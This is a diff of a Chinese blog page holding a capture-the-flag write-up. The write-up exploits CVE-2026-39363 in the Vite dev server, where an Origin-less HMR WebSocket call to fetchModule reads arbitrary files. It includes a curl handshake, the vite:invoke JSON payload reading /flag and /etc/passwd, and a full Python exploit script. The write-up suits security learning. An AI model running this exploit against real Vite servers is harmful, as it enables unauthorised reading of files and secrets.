@@ -5,9 +5,24 @@
 <head>
     <meta charset="utf-8">
     <meta name="keywords" content="挂钩都在干什么呢？, 编程,CTF,经历">
-    <meta name="description" content="挂钩都在干什么呢？背景这道题涉及CVE-2026-39363，首先我们要知道vite是一个前端开发工具，它的一个特点是 快速热更新（修改代码后页面立即更新） 这是通过一个websocket实现的，但是这里存在两个bug: 
+    <meta name="description" content="挂钩都在干什么呢？题目信息
 
-无 Origi">
+
+项目
+内容
+
+
+
+题目类型
+Web — Vite dev server 任意文件读取
+
+
+涉及漏洞
+CVE-2026-39363 (GHSA-p9ff-h696-f583)
+
+
+Flag
+flag{4NA1Y">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -416,19 +431,69 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="挂钩都在干什么呢？"><a href="#挂钩都在干什么呢？" class="headerlink" title="挂钩都在干什么呢？"></a>挂钩都在干什么呢？</h1><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>这道题涉及CVE-2026-39363，首先我们要知道vite是一个前端开发工具，它的一个特点是 <strong>快速热更新（修改代码后页面立即更新）</strong> 这是通过一个websocket实现的，但是这里存在两个bug: </p>
-<ol>
-<li>无 Origin 时，Vite 会跳过 WebSocket token 校验</li>
-<li>fetchModule 文件访问控制缺失,可以使用file协议实现任意文件读取</li>
-</ol>
-<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>首先验证HMR websocket是开启的,并且可以绕过token认证</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -i -N \</span><br><span class="line">  -H <span class="string">&quot;Connection: Upgrade&quot;</span> \</span><br><span class="line">  -H <span class="string">&quot;Upgrade: websocket&quot;</span> \</span><br><span class="line">  -H <span class="string">&quot;Sec-WebSocket-Key: <span class="subst">$(openssl rand -base64 16)</span>&quot;</span> \</span><br><span class="line">  -H <span class="string">&quot;Sec-WebSocket-Version: 13&quot;</span> \</span><br><span class="line">  -H <span class="string">&quot;Sec-WebSocket-Protocol: vite-hmr&quot;</span> \</span><br><span class="line">  --http1.1 \</span><br><span class="line">  http://192.168.81.1:8103/</span><br></pre></td></tr></table></figure>
+                <h1 id="挂钩都在干什么呢？"><a href="#挂钩都在干什么呢？" class="headerlink" title="挂钩都在干什么呢？"></a>挂钩都在干什么呢？</h1><h2 id="题目信息"><a href="#题目信息" class="headerlink" title="题目信息"></a>题目信息</h2><table>
+<thead>
+<tr>
+<th>项目</th>
+<th>内容</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>题目类型</td>
+<td>Web — Vite dev server 任意文件读取</td>
+</tr>
+<tr>
+<td>涉及漏洞</td>
+<td>CVE-2026-39363 (GHSA-p9ff-h696-f583)</td>
+</tr>
+<tr>
+<td>Flag</td>
+<td><code>flag{4NA1Y21nG-perFeCt-60ok-CluB_EXPEr13nCE20b5}</code></td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="0x01-附件分析"><a href="#0x01-附件分析" class="headerlink" title="0x01 附件分析"></a>0x01 附件分析</h2><p>项目结构:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ni_zhen_de_xu_yao_zhe_ge_ma_/</span><br><span class="line">├── Dockerfile</span><br><span class="line">├── docker-entrypoint.sh</span><br><span class="line">├── package.json            # vite 6.4.1,start: vite --host 0.0.0.0 --port 5173</span><br><span class="line">├── vite.config.js</span><br><span class="line">├── index.html</span><br><span class="line">├── public/robots.txt       # Disallow: /@fs/</span><br><span class="line">└── src/                    # 前端页面,连 ws 展示坐标点(与解题无关)</span><br></pre></td></tr></table></figure>
 
-<p>然后发送payload</p>
+<p>从 <code>docker-entrypoint.sh</code> 可知 flag 的存放位置与权限:</p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="variable">$FLAG</span> &gt; /flag</span><br><span class="line"><span class="built_in">unset</span> FLAG</span><br><span class="line"><span class="built_in">chown</span> ctf:ctf /flag</span><br><span class="line"><span class="built_in">chmod</span> 777 /flag</span><br><span class="line"><span class="built_in">exec</span> su-exec ctf npm run start</span><br></pre></td></tr></table></figure>
+
+<p>即 <strong>flag 在容器根目录 <code>/flag</code></strong>,而服务是一个暴露到公网的 <strong>Vite dev server</strong>(npm 跑的是 <code>vite</code>,不是构建后的静态产物)。</p>
+<p><code>vite.config.js</code> 的 fs 防护配置值得注意:</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="attr">fs</span>: &#123;</span><br><span class="line">  <span class="attr">strict</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">allow</span>: [ root, root/src, root/public ],   <span class="comment">// 只允许读这些目录</span></span><br><span class="line">  <span class="attr">deny</span>: [<span class="string">&#x27;.env&#x27;</span>, <span class="string">&#x27;.env.*&#x27;</span>, <span class="string">&#x27;*.&#123;crt,pem&#125;&#x27;</span>, <span class="string">&#x27;**/.git/**&#x27;</span>],</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>server.fs</code> 是 Vite dev server 防止任意文件读取的机制:<code>allow</code> 限制可以访问哪些目录,<code>deny</code> 追加禁止列表。<code>/flag</code> 在 <code>/</code> 下,不在 <code>allow</code> 内,理论上被拦。</p>
+<p><code>robots.txt</code> 中 <code>Disallow: /@fs/</code> 是个提示:<code>@fs/</code> 前缀是 Vite 暴露原始文件系统的方式,但直接访问仍会受 <code>server.fs.allow</code> 限制。</p>
+<blockquote>
+<p>页面本身连接 <code>ws://127.0.0.1:8081</code> 展示「三角洲行动」玩家坐标,README 也说明与解题无关,纯粹迷惑项。</p>
+</blockquote>
+<hr>
+<h2 id="0x02-漏洞发现"><a href="#0x02-漏洞发现" class="headerlink" title="0x02 漏洞发现"></a>0x02 漏洞发现</h2><p><strong>版本匹配 CVE:</strong> 附件 <code>package.json</code> 锁定 <code>vite: 6.4.1</code>。该版本正好落在 <strong>CVE-2026-39363</strong> 的受影响区间:</p>
+<ul>
+<li>Vite 6:<code>&gt;= 6.0.0, &lt;= 6.4.1</code>(6.4.2 修复)</li>
+<li>本质:Vite 的 <strong>HMR WebSocket</strong>(<code>Sec-WebSocket-Protocol: vite-hmr</code>)没有执行 <code>server.fs.allow</code> 校验,可调用服务端 <code>fetchModule</code> 方法传入 <code>file://</code> URL,实现任意文件读取。</li>
+</ul>
+<p><strong>先通过 HTTP 路径验证 fs.allow 确实生效(此路不通):</strong></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ curl -i <span class="string">&#x27;http://192.168.81.1:8103/@fs/flag&#x27;</span></span><br><span class="line">HTTP/1.1 403 Forbidden</span><br><span class="line">&lt;h1&gt;403 Restricted&lt;/h1&gt;</span><br><span class="line">&lt;p&gt;The request url <span class="string">&quot;/flag&quot;</span> is outside of Vite serving allow list.</span><br><span class="line">- /app</span><br><span class="line">- /app/src</span><br><span class="line">- /app/public&lt;/p&gt;</span><br></pre></td></tr></table></figure>
+
+<p>确认 HTTP 路径被封,但这也印证了 <code>/flag</code> 真实存在且容器根目录为 <code>/app</code>。</p>
+<hr>
+<h2 id="0x03-利用过程"><a href="#0x03-利用过程" class="headerlink" title="0x03 利用过程"></a>0x03 利用过程</h2><h3 id="1-WebSocket-握手"><a href="#1-WebSocket-握手" class="headerlink" title="1. WebSocket 握手"></a>1. WebSocket 握手</h3><p>CVE-2026-39363 的关键前提:非浏览器客户端可以<strong>不带 <code>Origin</code> 头</strong>连接 HMR WebSocket,从而绕过 <code>?token=</code> 校验,直接完成握手。</p>
+<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.81.1:8103</span><br><span class="line"><span class="attribute">Upgrade</span><span class="punctuation">: </span>websocket</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>Upgrade</span><br><span class="line"><span class="attribute">Sec-WebSocket-Key</span><span class="punctuation">: </span>&lt;random base64&gt;</span><br><span class="line"><span class="attribute">Sec-WebSocket-Version</span><span class="punctuation">: </span>13</span><br><span class="line"><span class="attribute">Sec-WebSocket-Protocol</span><span class="punctuation">: </span>vite-hmr</span><br></pre></td></tr></table></figure>
+
+<p>响应 <code>101 Switching Protocols</code> 即连接成功。</p>
+<h3 id="2-发送-vite-invoke-payload"><a href="#2-发送-vite-invoke-payload" class="headerlink" title="2. 发送 vite:invoke payload"></a>2. 发送 <code>vite:invoke</code> payload</h3><p>HMR 支持客户端通过 <code>custom</code> 消息反向调用服务端注册的方法 <code>fetchModule</code>,传入 <code>file://&lt;绝对路径&gt;?raw</code> 即可让服务端读取任意文件:</p>
 <figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;custom&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;event&quot;</span><span class="punctuation">:</span> <span class="string">&quot;vite:invoke&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;data&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;fetchModule&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;readflag&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;data&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;file:///flag?raw&quot;</span><span class="punctuation">]</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
 
-<p>完整脚本如下：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> websocket</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&quot;192.168.81.1:9380&quot;</span></span><br><span class="line"></span><br><span class="line">ws = websocket.create_connection(</span><br><span class="line">    <span class="string">f&quot;ws://<span class="subst">&#123;HOST&#125;</span>/&quot;</span>,</span><br><span class="line">    subprotocols=[<span class="string">&quot;vite-hmr&quot;</span>],</span><br><span class="line">    suppress_origin=<span class="literal">True</span>,</span><br><span class="line">    timeout=<span class="number">10</span>,</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">ws.send(json.dumps(&#123;</span><br><span class="line">    <span class="string">&quot;type&quot;</span>: <span class="string">&quot;custom&quot;</span>,</span><br><span class="line">    <span class="string">&quot;event&quot;</span>: <span class="string">&quot;vite:invoke&quot;</span>,</span><br><span class="line">    <span class="string">&quot;data&quot;</span>: &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;fetchModule&quot;</span>, <span class="string">&quot;id&quot;</span>: <span class="string">&quot;readflag&quot;</span>, <span class="string">&quot;data&quot;</span>: [<span class="string">&quot;file:///flag?raw&quot;</span>]&#125;,</span><br><span class="line">&#125;))</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    text = ws.recv()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;fetchModule&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> text:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="built_in">print</span>(text)</span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">ws.close()</span><br></pre></td></tr></table></figure>
+<p><code>?raw</code> 会让 Vite 把文件当作静态资源以 JS 模块返回。</p>
+<h3 id="3-解析响应"><a href="#3-解析响应" class="headerlink" title="3. 解析响应"></a>3. 解析响应</h3><p>服务端返回:</p>
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;custom&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;event&quot;</span><span class="punctuation">:</span> <span class="string">&quot;vite:invoke&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;data&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;fetchModule&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1response&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;data&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;result&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;code&quot;</span><span class="punctuation">:</span> <span class="string">&quot;export default \&quot;flag&#123;...&#125;\\n\&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;file&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/flag&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;file:///flag?raw&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>先用 <code>/etc/passwd</code> 验证漏洞成立,再读 <code>/flag</code>,得到:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;4NA1Y21nG-perFeCt-60ok-CluB_EXPEr13nCE20b5&#125;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="0x04-利用脚本"><a href="#0x04-利用脚本" class="headerlink" title="0x04 利用脚本"></a>0x04 利用脚本</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> websocket</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">ws = websocket.create_connection(</span><br><span class="line">    <span class="string">f&quot;ws://<span class="subst">&#123;HOST&#125;</span>/&quot;</span>,</span><br><span class="line">    subprotocols=[<span class="string">&quot;vite-hmr&quot;</span>],</span><br><span class="line">    suppress_origin=<span class="literal">True</span>,</span><br><span class="line">    timeout=<span class="number">10</span>,</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">ws.send(json.dumps(&#123;</span><br><span class="line">    <span class="string">&quot;type&quot;</span>: <span class="string">&quot;custom&quot;</span>,</span><br><span class="line">    <span class="string">&quot;event&quot;</span>: <span class="string">&quot;vite:invoke&quot;</span>,</span><br><span class="line">    <span class="string">&quot;data&quot;</span>: &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;fetchModule&quot;</span>, <span class="string">&quot;id&quot;</span>: <span class="string">&quot;readflag&quot;</span>, <span class="string">&quot;data&quot;</span>: [<span class="string">&quot;file:///flag?raw&quot;</span>]&#125;,</span><br><span class="line">&#125;))</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    text = ws.recv()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;fetchModule&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> text:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="built_in">print</span>(text)</span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">ws.close()</span><br></pre></td></tr></table></figure>
 
                 
             </div>
